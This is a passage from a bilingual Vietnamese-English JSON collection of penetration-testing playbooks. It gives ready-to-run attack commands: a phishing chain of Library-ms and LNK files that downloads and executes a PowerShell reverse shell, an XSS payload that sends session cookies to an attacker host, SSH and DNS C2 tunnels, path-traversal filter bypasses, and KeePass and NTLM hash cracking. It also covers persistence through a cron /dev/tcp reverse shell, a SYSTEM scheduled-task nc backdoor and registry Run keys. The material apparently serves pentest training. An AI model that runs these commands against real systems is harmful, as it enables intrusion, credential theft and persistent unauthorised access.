      {"vi": "**Kích hoạt Xác thực (Target):**", "en": "**Trigger Authentication (Target):**", "command": "dir \\\\<KALI_IP>\\fakepath"},
      {"vi": "**Lấy Hash:**", "en": "**Capture Hash:**", "command": "# Copy hash from Responder/Impacket output"},
      {"vi": "**Crack Hash (Hashcat):**", "en": "**Crack Hash (Hashcat):**", "command": "hashcat -m 5600 captured.hash wordlist.txt"}
    ],
    "related_knowledge_ids": ["password_cracking_net_ntlmv2", "responder", "impacket-smbserver", "hashcat", "mode_5600", "password_cracking_lab_net_ntlmv2"]
  },
  "playbook_68_client_side_library_lnk": {
    "title": {
      "vi": "Playbook 68: Client-Side - Windows Library (.Library-ms) + LNK Attack",
      "en": "Playbook 68: Client-Side - Windows Library (.Library-ms) + LNK Attack"
    },
    "assumption": "Có thể lừa người dùng Windows mở file `.Library-ms`.",
    "objective": "Tạo file `.Library-ms` và `.lnk` độc hại, host trên WebDAV, để có reverse shell.",
    "tools": ["wsgidav", "python (http.server)", "text editor", "powershell (for payload)", "swaks (for delivery)"],
    "phases": ["Initial Foothold", "Social Engineering"],
    "techniques": ["Client-Side Execution", "Windows Library File Abuse", "LNK File Abuse", "WebDAV", "Reverse Shell"],
    "targets": ["Windows User", ".Library-ms", ".lnk"],
    "os": ["Windows", "Linux (Kali for hosting)"],
    "tags": ["client-side", "windows", "library-ms", "lnk", "webdav", "wsgidav", "reverse shell", "phishing", "powercat"],
    "content": "## Playbook 68: Client-Side - Library + LNK Attack 🎣📚🔗➡️🐚\n\n**Giả định:** Có thể lừa user mở file `.Library-ms`.\n\n**Mục tiêu:** Có reverse shell qua WebDAV và LNK.\n\n**Các bước thực hiện:**\n\n1.  **Payload (Kali):** Host `powercat.ps1` (`python http.server`), tạo lệnh PS reverse shell.\n2.  **WebDAV (Kali):** Cài `wsgidav`, tạo dir `webdav`, chạy `wsgidav ... --auth anonymous`.\n3.  **File LNK (Kali):** Tạo `payload.lnk` trong `webdav` trỏ đến lệnh PS.\n4.  **File Library-ms (Kali):** Tạo XML `config.Library-ms` trỏ đến `http://<kali_ip>`.\n5.  **Listener:** `nc -lvnp 4444`.\n6.  **Gửi File:** Gửi `.Library-ms` cho nạn nhân.",
    "steps": [
      {"vi": "**Chuẩn bị Payload PS & HTTP Server (Kali):**", "en": "**Prepare PS Payload & HTTP Server (Kali):**", "command": "echo 'powershell -c \"IEX(iwr http://<kali_ip>:8000/pc.ps1);pc -c <kali_ip> -p 4444 -e powershell\"' > payload.txt; python3 -m http.server 8000"},
      {"vi": "**Chạy WebDAV Server (Kali):**", "en": "**Run WebDAV Server (Kali):**", "command": "mkdir webdav; wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r ./webdav"},
      {"vi": "**Tạo LNK File trỏ payload (trong webdav):**", "en": "**Create LNK File pointing to payload (in webdav):**", "command": "# Create payload.lnk targeting powershell command from step 1"},
      {"vi": "**Tạo Library-ms File:**", "en": "**Create Library-ms File:**", "command": "# Create XML file pointing to http://<kali_ip> (See knowledge base)"},
      {"vi": "**Mở Listener:**", "en": "**Start Listener:**", "command": "rlwrap nc -lvnp 4444"},
      {"vi": "**Gửi File Library-ms:**", "en": "**Send Library-ms File:**", "command": "# Deliver file via email/share"}
    ],
    "related_knowledge_ids": ["clientside_windows_libraries_theory", "wsgidav", "python", "http_server", "powershell", "powercat", "library-ms", "lnk", "rce_kali_setup", "nc"]
  },
  "playbook_69_pivoting_plink": {
    "title": {
      "vi": "Playbook 69: Pivoting - SSH Remote Port Forwarding với Plink",
      "en": "Playbook 69: Pivoting - SSH Remote Port Forwarding with Plink"
    },
    "assumption": "Có shell trên Windows Box A (Pivot). Box A kết nối được SSH ra Kali. Cần truy cập cổng nội bộ từ Kali.",
    "objective": "Sử dụng `Plink.exe` để tạo SSH remote tunnel (-R) từ Box A về Kali.",
    "tools": ["plink.exe", "ssh (server on Kali)", "xfreerdp"],
    "phases": ["Pivoting", "Post Exploitation"],
    "techniques": ["SSH Tunneling", "Remote Port Forwarding"],
    "targets": ["Internal Network Service"],
    "os": ["Windows", "Linux (Kali)"],
    "tags": ["pivoting", "windows", "plink", "ssh", "ssh tunneling", "remote port forwarding", "ssh_r"],
    "content": "## Playbook 69: Pivoting - Plink Remote Forwarding 🚶‍♂️🔗⬅️🎯\n\n**Giả định:** Shell trên Pivot Windows, SSH outbound ok, cần truy cập cổng nội bộ.\n\n**Mục tiêu:** Tạo SSH remote tunnel (-R) bằng Plink.\n\n**Các bước thực hiện:**\n\n1.  **Kali:** Bật SSH server (`systemctl start ssh`).\n2.  **Target:** Tải `plink.exe` lên.\n3.  **Target:** Chạy Plink: `cmd /c echo y | plink.exe -ssh -l kali -pw kali -R 127.0.0.1:[Listen_Kali]:<target_ip>:[Target_Port] <kali_ip>`.\n4.  **Kali:** Kết nối đến `127.0.0.1:[Listen_Kali]`.",
    "steps": [
      {"vi": "**Bật SSH Server (Kali):**", "en": "**Start SSH Server (Kali):**", "command": "sudo systemctl start ssh"},
      {"vi": "**Tải Plink lên Target:**", "en": "**Upload Plink to Target:**", "command": "# Transfer plink.exe to C:\\Windows\\Temp\\"},
      {"vi": "**Chạy Plink Remote Forward (Target):**", "en": "**Run Plink Remote Forward (Target):**", "command": "cmd.exe /c echo y | C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:[Listen_Port_Kali]:<target_ip>:[Target_Port] <kali_ip>"},
      {"vi": "**Truy cập từ Kali (Ví dụ RDP):**", "en": "**Access from Kali (Example RDP):**", "command": "xfreerdp /v:127.0.0.1:[Listen_Port_Kali] /u:user /p:pass"}
    ],
    "related_knowledge_ids": ["portfwd_windows_plink", "plink", "ssh", "ssh_r", "remote_port_forwarding", "xfreerdp", "connect_rdp_xfreerdp"]
  },
  "playbook_70_pivoting_dnscat2": {
    "title": {
      "vi": "Playbook 70: Pivoting - DNS Tunneling với dnscat2",
      "en": "Playbook 70: Pivoting - DNS Tunneling with dnscat2"
    },
    "assumption": "Có shell trên Pivot. Chỉ có DNS outbound hoạt động.",
    "objective": "Thiết lập C2 tunnel qua DNS bằng dnscat2, có thể forward cổng.",
    "tools": ["dnscat2-server", "dnscat2-client (powershell/c)"],
    "phases": ["Pivoting", "Command and Control", "Post Exploitation"],
    "techniques": ["DNS Tunneling", "Command and Control", "Port Forwarding"],
    "targets": ["DNS Protocol"],
    "os": ["Any"],
    "tags": ["pivoting", "dns tunneling", "dnscat2", "c2", "port forwarding", "dns"],
    "content": "## Playbook 70: Pivoting - DNS Tunneling với dnscat2 🚶‍♂️🚇➡️🌍 (DNS)\n\n**Giả định:** Chỉ có DNS outbound hoạt động trên Pivot.\n\n**Mục tiêu:** Tạo C2 tunnel qua DNS, có thể forward cổng.\n\n**Các bước thực hiện:**\n\n1.  **Kali:** Chạy server `sudo dnscat2-server <Domain/IP> --secret=<Secret>`.\n2.  **Target:** Tải & chạy client (PS hoặc C) `dnscat2 --secret=<Secret> <Domain/IP>`.\n3.  **Kali (Console):** `sessions`, `session -i <id>`.\n4.  **Kali (Console):** Lệnh `shell`, `exec`, `listen <kali_ip:port> <target_ip:port>`.",
    "steps": [
      {"vi": "**Chạy Server (Kali):**", "en": "**Run Server (Kali):**", "command": "sudo dnscat2-server <Your_Domain_Or_IP> --secret=<YourSecret>"},
      {"vi": "**Chạy Client (Target - C):**", "en": "**Run Client (Target - C):**", "command": "./dnscat2 --secret=<YourSecret> <Your_Domain_Or_IP>"},
      {"vi": "**Tương tác (dnscat2 console):**", "en": "**Interact (dnscat2 console):**", "command": "sessions -> session -i <id> -> shell"},
      {"vi": "**Thiết lập Port Forward (dnscat2 console):**", "en": "**Setup Port Forward (dnscat2 console):**", "command": "listen 0.0.0.0:8080 10.0.0.5:80"}
    ],
    "related_knowledge_ids": ["dns_tunneling_dnscat2", "pivoting", "dnscat2"]
  },
  "playbook_71_aws_exploit_public_snapshot": {
    "title": {
      "vi": "Playbook 71: AWS - Khai thác EBS Snapshot Công khai",
      "en": "Playbook 71: AWS - Exploiting Public EBS Snapshot"
    },
    "assumption": "Tìm thấy EBS snapshot công khai/chia sẻ.",
    "objective": "Tạo volume từ snapshot, mount vào EC2, trích xuất dữ liệu.",
    "tools": ["aws cli"],
    "phases": ["Exploitation", "Credential Access", "Data Exfiltration"],
    "techniques": ["AWS EBS Snapshot Exploitation"],
    "targets": ["AWS EBS Snapshot", "EC2 Instance"],
    "os": ["Any (AWS Environment)"],
    "tags": ["aws", "cloud", "ebs", "snapshot", "exploitation", "aws cli", "ec2", "credential hunting"],
    "content": "## Playbook 71: AWS - Khai thác EBS Snapshot Công khai ☁️💾➡️🔑\n\n**Giả định:** Tìm thấy EBS snapshot công khai/chia sẻ.\n\n**Mục tiêu:** Tạo volume, mount và trích xuất dữ liệu.\n\n**Các bước thực hiện (AWS CLI):**\n\n1.  **Tạo Volume:** `aws ec2 create-volume --snapshot-id <snap_id> --availability-zone <az>`.\n2.  **Attach Volume:** `aws ec2 attach-volume --volume-id <vol_id> --instance-id <ec2_id> --device /dev/xvdf`.\n3.  **SSH vào EC2.**\n4.  **Mount Volume:** `lsblk`, `sudo mkdir /mnt/data`, `sudo mount /dev/xvdf1 /mnt/data`.\n5.  **Trích xuất Dữ liệu:** `grep -ri 'password' /mnt/data`.\n6.  **Dọn dẹp:** `umount`, `detach-volume`, `delete-volume`.",
    "steps": [
      {"vi": "**Tạo Volume từ Snapshot:**", "en": "**Create Volume from Snapshot:**", "command": "aws ec2 create-volume --snapshot-id <snap_id> --availability-zone <your_az>"},
      {"vi": "**Attach Volume vào Instance:**", "en": "**Attach Volume to Instance:**", "command": "aws ec2 attach-volume --volume-id <vol_id> --instance-id <instance_id> --device /dev/xvdf"},
      {"vi": "**Mount Volume (Trong EC2):**", "en": "**Mount Volume (Inside EC2):**", "command": "sudo mkdir /mnt/data; sudo mount /dev/xvdf1 /mnt/data"}, // Giả sử có partition
      {"vi": "**Tìm kiếm Dữ liệu:**", "en": "**Search for Data:**", "command": "grep -riE 'password|secret|key' /mnt/data"},
      {"vi": "**Dọn dẹp:**", "en": "**Cleanup:**", "command": "sudo umount /mnt/data; aws ec2 detach-volume ...; aws ec2 delete-volume ..."}
    ],
    "related_knowledge_ids": ["aws_enum_api_public_resources", "aws cli", "ebs", "ec2"]
  },
  "playbook_72_xss_cookie_steal_basic": {
    "title": {
      "vi": "Playbook 72: XSS - Đánh cắp Cookie (Cơ bản)",
      "en": "Playbook 72: XSS - Cookie Stealing (Basic)"
    },
    "assumption": "Phát hiện XSS (Reflected/Stored) trên trang cần login.",
    "objective": "Chèn JS để gửi cookie session về server kẻ tấn công.",
    "tools": ["python (http.server)", "nc", "browser", "javascript"],
    "phases": ["Exploitation", "Credential Access"],
    "techniques": ["Cross-Site Scripting (XSS)", "Cookie Stealing", "Session Hijacking"],
    "targets": ["Web Application User Session"],
    "os": ["Any"],
    "tags": ["web", "xss", "cross-site scripting", "cookie stealing", "session hijacking", "javascript", "reflected", "stored"],
    "content": "## Playbook 72: XSS - Đánh cắp Cookie 🍪🎣\n\n**Giả định:** Phát hiện XSS.\n\n**Mục tiêu:** Gửi cookie về server attacker.\n\n**Các bước thực hiện:**\n\n1.  **Listener (Kali):** `sudo python3 -m http.server 80` hoặc `nc -lvnp 80`.\n2.  **Payload XSS:** `<script>document.location='http://<kali_ip>/?c=' + document.cookie;</script>`.\n3.  **Chèn Payload:** Vào URL (Reflected) hoặc field (Stored).\n4.  **Nhận Cookie:** Kiểm tra log listener.\n5.  **Sử dụng Cookie:** Dùng Cookie Editor hoặc Burp.",
    "steps": [
      {"vi": "**Chạy Listener (Kali - HTTP):**", "en": "**Run Listener (Kali - HTTP):**", "command": "sudo python3 -m http.server 80"},
      {"vi": "**Tạo Payload XSS:**", "en": "**Create XSS Payload:**", "command": "<script>document.location='http://<kali_ip>/?c=' + document.cookie;</script>"},
      {"vi": "**Chèn Payload:**", "en": "**Inject Payload:**", "command": "# Inject into vulnerable parameter/field"},
      {"vi": "**Nhận Cookie:**", "en": "**Receive Cookie:**", "command": "# Check HTTP server log on Kali"},
      {"vi": "**Sử dụng Cookie:**", "en": "**Use Cookie:**", "command": "# Use Cookie Editor or Burp to set the stolen cookie"}
    ],
    "related_knowledge_ids": ["xss", "javascript", "cookie stealing", "session hijacking", "python", "http_server", "nc"]
  },
  "playbook_73_dir_traversal_encoding": {
    "title": {
      "vi": "Playbook 73: Directory Traversal - Bypass Filter bằng Encoding",
      "en": "Playbook 73: Directory Traversal - Filter Bypass via Encoding"
    },
    "assumption": "Nghi ngờ Directory Traversal nhưng `../../` bị chặn.",
    "objective": "Sử dụng encoding (URL, Double URL) để bypass filter.",
    "tools": ["curl", "burpsuite", "browser"],
    "phases": ["Exploitation"],
    "techniques": ["Directory Traversal", "Filter Bypass", "URL Encoding"],
    "targets": ["Web Application Filter"],
    "os": ["Any"],
    "tags": ["web", "directory traversal", "path traversal", "filter bypass", "encoding", "url encoding", "curl"],
    "content": "## Playbook 73: Directory Traversal - Encoding Bypass 🔓📄\n\n**Giả định:** Payload `../../` bị chặn.\n\n**Mục tiêu:** Bypass filter bằng encoding.\n\n**Các bước thực hiện:**\n\n1.  **Thử URL Encode:** `..%2f` -> `%2e%2e%2f`.\n2.  **Thử Double URL Encode:** `%2e%2e%2f` -> `%252e%252e%252f`.\n3.  **Thử Encoding Khác:** `..%c0%af`, `..%u2215`.\n4.  **Thử Path Truncation:** `...passwd%00.jpg`, `...passwd/.`.",
    "steps": [
      {"vi": "**Thử URL Encoding:**", "en": "**Try URL Encoding:**", "command": "curl \"http://<target_ip>/vuln.php?file=%2e%2e%2f%2e%2e%2fetc/passwd\""},
      {"vi": "**Thử Double URL Encoding:**", "en": "**Try Double URL Encoding:**", "command": "curl \"http://<target_ip>/vuln.php?file=%252e%252e%252f%252e%252e%252fetc/passwd\""},
      {"vi": "**Thử Path Truncation (Null Byte):**", "en": "**Try Path Truncation (Null Byte):**", "command": "curl \"http://<target_ip>/vuln.php?file=../../etc/passwd%00.jpg\""}
    ],
    "related_knowledge_ids": ["directory_traversal", "filter bypass", "url encoding", "web_attack_directory_traversal", "lfi"]
  },
  "playbook_74_fix_exploit_cross_compile": {
    "title": {
      "vi": "Playbook 74: Sửa lỗi Exploit - Cross-Compiling (mingw-w64)",
      "en": "Playbook 74: Fixing Exploits - Cross-Compiling (mingw-w64)"
    },
    "assumption": "Có mã nguồn exploit C/C++ cho Windows, đang ở Kali.",
    "objective": "Biên dịch chéo mã nguồn thành file .exe trên Kali.",
    "tools": ["mingw-w64 (gcc)", "searchsploit"],
    "phases": ["Exploitation", "Exploit Development"],
    "techniques": ["Cross-Compiling", "Exploit Modification"],
    "targets": ["Windows Executable (PE)"],
    "os": ["Windows", "Linux (Kali for compiling)"],
    "tags": ["exploit", "fixing exploits", "cross-compile", "mingw-w64", "windows", "c", "gcc"],
    "content": "## Playbook 74: Sửa lỗi Exploit - Cross-Compiling 🐧➡️💻.exe\n\n**Giả định:** Có mã nguồn C/C++ cho Windows, cần compile trên Kali.\n\n**Mục tiêu:** Biên dịch chéo ra file `.exe`.\n\n**Các bước thực hiện:**\n\n1.  **Cài mingw-w64 (Kali):** `sudo apt install mingw-w64`.\n2.  **Lấy Mã Nguồn.**\n3.  **Sửa đổi (Nếu cần).**\n4.  **Compile 32-bit:** `i686-w64-mingw32-gcc exploit.c -o exploit32.exe -lws2_32`.\n5.  **Compile 64-bit:** `x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe -lws2_32`.\n6.  **Chuyển & Thực thi.**",
    "steps": [
      {"vi": "**Cài mingw-w64 (Kali):**", "en": "**Install mingw-w64 (Kali):**", "command": "sudo apt install mingw-w64 -y"},
      {"vi": "**Compile 32-bit:**", "en": "**Compile 32-bit:**", "command": "i686-w64-mingw32-gcc exploit.c -o exploit_x86.exe -lws2_32"},
      {"vi": "**Compile 64-bit:**", "en": "**Compile 64-bit:**", "command": "x86_64-w64-mingw32-gcc exploit.c -o exploit_x64.exe -lws2_32"},
      {"vi": "**Chuyển & Thực thi:**", "en": "**Transfer & Execute:**", "command": "# Transfer .exe to target and run"}
    ],
    "related_knowledge_ids": ["fix_exploit_memory_corruption_compile", "mingw-w64", "gcc", "searchsploit"]
  },
  "playbook_75_git_recon_deep": {
    "title": {
      "vi": "Playbook 75: Git Recon - Phân tích Lịch sử Commit",
      "en": "Playbook 75: Git Recon - Analyzing Commit History"
    },
    "assumption": "Đã tải về kho lưu trữ `.git` bị lộ.",
    "objective": "Phân tích lịch sử commit Git để tìm secrets.",
    "tools": ["git", "git-dumper", "gitleaks"],
    "phases": ["Reconnaissance", "Enumeration", "Credential Access"],
    "techniques": ["Git Reconnaissance", "Credential Hunting"],
    "targets": ["Git Repository"],
    "os": ["Any"],
    "tags": ["recon", "enumeration", "git", "git log", "git show", "git-dumper", "gitleaks", "credential hunting", "secrets"],
    "content": "## Playbook 75: Git Recon - Phân tích Lịch sử Commit 🕵️‍♂️⏳➡️🔑\n\n**Giả định:** Đã tải về repo `.git`.\n\n**Mục tiêu:** Tìm secrets trong lịch sử commit.\n\n**Các bước thực hiện:**\n\n1.  **Quét Gitleaks:** `gitleaks detect -s . -v`.\n2.  **Xem Log:** `git log --stat` hoặc `git log -p`.\n3.  **Kiểm tra Commit:** `git show <commit_id>`.\n4.  **Kiểm tra Branch:** `git branch -a`, `git checkout <branch>`.",
    "steps": [
      {"vi": "**Dump Repo (Nếu từ Web):**", "en": "**Dump Repo (If from Web):**", "command": "git-dumper http://<target_ip>/.git/ ./repo_dump"},
      {"vi": "**Quét Gitleaks:**", "en": "**Scan Gitleaks:**", "command": "cd repo_dump; gitleaks detect -s . -v"},
      {"vi": "**Xem Log Commit:**", "en": "**View Commit Log:**", "command": "git log --stat"},
      {"vi": "**Xem Chi tiết Commit:**", "en": "**View Commit Details:**", "command": "git show <commit_id>"},
      {"vi": "**Kiểm tra Branch Khác:**", "en": "**Check Other Branches:**", "command": "git branch -a; git checkout <branch_name>"}
    ],
    "related_knowledge_ids": ["github_recon_git", "git", "git log", "git show", "git-dumper", "gitleaks"]
  },
  "playbook_76_keepass_crack": {
    "title": {
      "vi": "Playbook 76: Tìm và Crack File KeePass (.kdbx)",
      "en": "Playbook 76: Finding and Cracking KeePass Files (.kdbx)"
    },
    "assumption": "Có shell trên target. Nghi ngờ user dùng KeePass.",
    "objective": "Tìm file `.kdbx` và crack master password.",
    "tools": ["find", "Get-ChildItem", "keepass2john", "john", "hashcat"],
    "phases": ["Post Exploitation", "Credential Access"],
    "techniques": ["Credential Hunting", "Password Manager Cracking", "Offline Hash Cracking"],
    "targets": ["KeePass Database (.kdbx)"],
    "os": ["Windows", "Linux"],
    "tags": ["credential hunting", "keepass", "kdbx", "password manager", "find", "get-childitem", "keepass2john", "john", "hashcat", "mode_13400"],
    "content": "## Playbook 76: Tìm và Crack KeePass (.kdbx) 🕵️‍♂️📦➡️🔑➡️🔓\n\n**Giả định:** Có shell, nghi ngờ có file KeePass.\n\n**Mục tiêu:** Tìm và crack file `.kdbx`.\n\n**Các bước thực hiện:**\n\n1.  **Tìm File:** `find / -name *.kdbx` (Linux) hoặc `Get-ChildItem -Path C:\\ -Include *.kdbx ...` (Windows).\n2.  **Tải File về Kali.**\n3.  **Trích xuất Hash:** `keepass2john db.kdbx > hash`.\n4.  **Crack (John):** `john --wordlist=wl hash`.\n5.  **Crack (Hashcat):** `hashcat -m 13400 hash wl`.",
    "steps": [
      {"vi": "**Tìm File (Linux):**", "en": "**Find File (Linux):**", "command": "find / -name *.kdbx 2>/dev/null"},
      {"vi": "**Tìm File (Windows):**", "en": "**Find File (Windows):**", "command": "Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -EA SilentlyContinue"},
      {"vi": "**Tải File về Kali:**", "en": "**Download File to Kali:**"},
      {"vi": "**Trích xuất Hash (Kali):**", "en": "**Extract Hash (Kali):**", "command": "keepass2john database.kdbx > keepass.hash"},
      {"vi": "**Crack (John):**", "en": "**Crack (John):**", "command": "john --wordlist=wl.txt keepass.hash"},
      {"vi": "**Crack (Hashcat):**", "en": "**Crack (Hashcat):**", "command": "hashcat -m 13400 keepass.hash wl.txt"}
    ],
    "related_knowledge_ids": ["find_kdbx_files", "find", "Get-ChildItem", "keepass2john", "john", "hashcat", "post_exploitation_kdbx_crack", "password_cracking_keepass", "mode_13400"]
  },
  "playbook_77_windows_foothold_creds_webconfig": {
    "title": {
      "vi": "Playbook 77: Windows Foothold qua Credentials trong web.config",
      "en": "Playbook 77: Windows Foothold via Credentials in web.config"
    },
    "assumption": "Đọc được file `web.config` chứa connection string.",
    "objective": "Trích xuất creds từ `web.config` và sử dụng.",
    "tools": ["curl", "grep", "impacket-mssqlclient", "evil-winrm"],
    "phases": ["Initial Foothold", "Credential Access"],
    "techniques": ["Credential Hunting", "Configuration File Analysis"],
    "targets": ["web.config", "Database Credentials", "Windows Credentials"],
    "os": ["Windows"],
    "tags": ["windows", "foothold", "credential hunting", "web.config", "iis", "asp.net", "database", "mssql", "impacket-mssqlclient"],
    "content": "## Playbook 77: Windows Foothold - Creds từ web.config 🚪📄➡️🔑\n\n**Giả định:** Đọc được `web.config`.\n\n**Mục tiêu:** Trích xuất và sử dụng credentials.\n\n**Các bước thực hiện:**\n\n1.  **Lấy Nội dung:** `curl` hoặc `type`.\n2.  **Tìm Connection String:** `<connectionStrings>`, `Password=`, `User ID=`.\n3.  **Thử Creds:** Kết nối DB (`impacket-mssqlclient`) hoặc thử lateral movement (`crackmapexec`, `evil-winrm`).",
    "steps": [
      {"vi": "**Lấy web.config:**", "en": "**Get web.config:**", "command": "curl http://<target_ip>/path/to/web.config # Hoặc type C:\\inetpub\\wwwroot\\web.config"},
      {"vi": "**Tìm Connection String:**", "en": "**Find Connection String:**", "command": "grep -iE 'connectionString|password=' web.config"},
      {"vi": "**Thử Kết nối MSSQL:**", "en": "**Try Connect MSSQL:**", "command": "impacket-mssqlclient <user>:<password>@<db_server>"},
      {"vi": "**Thử Lateral Movement (CME):**", "en": "**Try Lateral Movement (CME):**", "command": "crackmapexec smb <target_ip> -u <user> -p '<password>'"}
    ],
    "related_knowledge_ids": ["winprivesc_password_hunting_files", "winprivesc_other_vectors", "web.config", "curl", "grep", "type", "impacket-mssqlclient", "crackmapexec", "evil-winrm_connection", "playbook_32_foothold_mssql_xpcmdshell"]
  },
  "playbook_78_linux_foothold_creds_wpconfig": {
    "title": {
      "vi": "Playbook 78: Linux Foothold qua Credentials trong wp-config.php",
      "en": "Playbook 78: Linux Foothold via Credentials in wp-config.php"
    },
    "assumption": "Đọc được file `wp-config.php` của WordPress.",
    "objective": "Trích xuất creds DB (MySQL) và thử sử dụng chúng.",
    "tools": ["curl", "cat", "grep", "mysql", "ssh", "su"],
    "phases": ["Initial Foothold", "Credential Access"],
    "techniques": ["Credential Hunting", "Configuration File Analysis"],
    "targets": ["wp-config.php", "Database Credentials", "Linux Credentials"],
    "os": ["Linux"],
    "tags": ["linux", "foothold", "credential hunting", "wordpress", "wp-config.php", "mysql", "database"],
    "content": "## Playbook 78: Linux Foothold - Creds từ wp-config.php 🚪📄➡️🔑\n\n**Giả định:** Đọc được `wp-config.php`.\n\n**Mục tiêu:** Trích xuất creds DB và thử sử dụng.\n\n**Các bước thực hiện:**\n\n1.  **Lấy Nội dung:** `curl` hoặc `cat`.\n2.  **Tìm Creds:** `DB_USER`, `DB_PASSWORD`, `DB_HOST`.\n3.  **Thử Creds:** Kết nối DB (`mysql`) hoặc thử SSH/SU (Password Reuse).",
    "steps": [
      {"vi": "**Lấy wp-config.php:**", "en": "**Get wp-config.php:**", "command": "curl http://<target_ip>/wp-config.php # Hoặc cat /var/www/html/wp-config.php"},
      {"vi": "**Tìm Creds DB:**", "en": "**Find DB Creds:**", "command": "grep -E 'DB_USER|DB_PASSWORD|DB_HOST' wp-config.php"},
      {"vi": "**Thử Kết nối MySQL:**", "en": "**Try Connect MySQL:**", "command": "mysql -u <db_user> -p'<db_password>' -h <db_host>"},
      {"vi": "**Thử Password Reuse (SSH):**", "en": "**Try Password Reuse (SSH):**", "command": "ssh <user>@<target_ip> # (Use DB password)"},
      {"vi": "**Thử Password Reuse (SU):**", "en": "**Try Password Reuse (SU):**", "command": "su - <user> # (Use DB password)"}
    ],
    "related_knowledge_ids": ["wordpress", "wp-config.php", "mysql", "database", "credential_hunting", "sqli_theory_connection", "ssh", "su"]
  },
  "playbook_79_linux_persistence_cron": {
    "title": {
      "vi": "Playbook 79: Linux Persistence qua User Cron Job",
      "en": "Playbook 79: Linux Persistence via User Cron Job"
    },
    "assumption": "Có shell user Linux.",
    "objective": "Thêm cron job để chạy reverse shell định kỳ.",
    "tools": ["crontab", "echo", "nc", "bash"],
    "phases": ["Persistence"],
    "techniques": ["Persistence", "Cron Job Abuse"],
    "targets": ["Linux Crontab"],
    "os": ["Linux"],
    "tags": ["linux", "persistence", "cron", "crontab", "reverse shell"],
    "content": "## Playbook 79: Linux Persistence - User Cron Job 📌⏰\n\n**Giả định:** Có shell user Linux.\n\n**Mục tiêu:** Thêm cron job reverse shell.\n\n**Các bước thực hiện:**\n\n1.  **Listener (Kali):** `nc -lvnp 4448`.\n2.  **Tạo Cron Job:** `(crontab -l 2>/dev/null; echo \"* * * * * bash -c 'bash -i ...'\") | crontab -`.\n3.  **Kiểm tra:** `crontab -l`.\n4.  **Chờ Kết nối.**",
    "steps": [
      {"vi": "**Mở Listener:**", "en": "**Start Listener:**", "command": "rlwrap nc -lvnp 4448"},
      {"vi": "**Thêm Cron Job:**", "en": "**Add Cron Job:**", "command": "(crontab -l 2>/dev/null; echo \"* * * * * bash -c 'bash -i >& /dev/tcp/<kali_ip>/4448 0>&1'\") | crontab -"},
      {"vi": "**Kiểm tra Crontab:**", "en": "**Check Crontab:**", "command": "crontab -l"},
      {"vi": "**Chờ Kết nối:**", "en": "**Wait for Connection:**"}
    ],
    "related_knowledge_ids": ["linuxprivesc_cron_enum", "crontab", "persistence", "reverse_shell", "nc", "bash"]
  },
  "playbook_80_windows_persistence_schtask": {
    "title": {
      "vi": "Playbook 80: Windows Persistence qua Scheduled Task",
      "en": "Playbook 80: Windows Persistence via Scheduled Task"
    },
    "assumption": "Có shell user (hoặc Admin/SYSTEM) trên Windows.",
    "objective": "Tạo scheduled task để chạy reverse shell (ví dụ: khi login, định kỳ).",
    "tools": ["schtasks", "nc", "powershell (payload)"],
    "phases": ["Persistence"],
    "techniques": ["Persistence", "Scheduled Task Abuse"],
    "targets": ["Windows Scheduled Tasks"],
    "os": ["Windows"],
    "tags": ["windows", "persistence", "scheduled tasks", "schtasks", "reverse shell"],
    "content": "## Playbook 80: Windows Persistence - Scheduled Task 📌⏰\n\n**Giả định:** Có shell Windows.\n\n**Mục tiêu:** Tạo scheduled task chạy reverse shell.\n\n**Các bước thực hiện:**\n\n1.  **Payload:** Tải payload (`nc.exe`, `rev.ps1`) lên target.\n2.  **Listener (Kali):** `nc -lvnp 4449`.\n3.  **Tạo Task:** `schtasks /create /tn \"Name\" /tr \"C:\\path\\payload\" /sc HOURLY /ru SYSTEM` (hoặc `/sc ONLOGON`).\n4.  **Kiểm tra:** `schtasks /query /tn \"Name\"`.\n5.  **Chờ Kết nối.**",
    "steps": [
      {"vi": "**Chuẩn bị Payload & Listener:**", "en": "**Prepare Payload & Listener:**", "command": "# Upload nc.exe/rev.ps1 to target; rlwrap nc -lvnp 4449 on Kali"},
      {"vi": "**Tạo Task (Chạy hàng giờ):**", "en": "**Create Task (Hourly):**", "command": "schtasks /create /tn \"MyBackdoor\" /tr \"C:\\Windows\\Temp\\nc.exe <kali_ip> 4449 -e cmd.exe\" /sc HOURLY /ru SYSTEM"},
      {"vi": "**Tạo Task (Khi Login - Cần quyền):**", "en": "**Create Task (On Logon - Needs Privs):**", "command": "schtasks /create /tn \"MyBackdoorLogin\" /tr \"C:\\Windows\\Temp\\rev.ps1\" /sc ONLOGON /ru <TargetUser>"},
      {"vi": "**Kiểm tra Task:**", "en": "**Check Task:**", "command": "schtasks /query /tn \"MyBackdoor\""},
      {"vi": "**Chờ Trigger:**", "en": "**Wait for Trigger:**"}
    ],
    "related_knowledge_ids": ["winprivesc_scheduled_tasks", "schtasks", "persistence", "nc", "powershell", "reverse_shell"]
  },
  "playbook_81_windows_persistence_runkey": {
    "title": {
      "vi": "Playbook 81: Windows Persistence qua Registry Run Key",
      "en": "Playbook 81: Windows Persistence via Registry Run Key"
    },
    "assumption": "Có shell user (hoặc Admin/SYSTEM) trên Windows.",
    "objective": "Thêm entry vào Registry Run key (`HKCU` hoặc `HKLM`) để tự chạy payload khi user login.",
    "tools": ["reg add", "nc", "powershell (payload)"],
    "phases": ["Persistence"],
    "techniques": ["Persistence", "Registry Run Keys"],
    "targets": ["Windows Registry"],
    "os": ["Windows"],
    "tags": ["windows", "persistence", "registry", "run keys", "autorun", "reverse shell"],
    "content": "## Playbook 81: Windows Persistence - Registry Run Key 📌🔑\n\n**Giả định:** Có shell Windows.\n\n**Mục tiêu:** Thêm payload vào Registry Run key.\n\n**Các bước thực hiện:**\n\n1.  **Payload:** Tải payload (`nc.exe`, `rev.ps1`) lên target.\n2.  **Listener (Kali):** `nc -lvnp 4450`.\n3.  **Thêm Key (HKCU):** `reg add HKCU\\...\\Run /v \"Name\" /t REG_SZ /d \"C:\\path\\payload\" /f`.\n4.  **Thêm Key (HKLM - Admin):** `reg add HKLM\\...\\Run /v \"Name\" ... /f`.\n5.  **Kiểm tra:** `reg query HKCU\\...\\Run /v \"Name\"`.\n6.  **Chờ Login.**",
    "steps": [
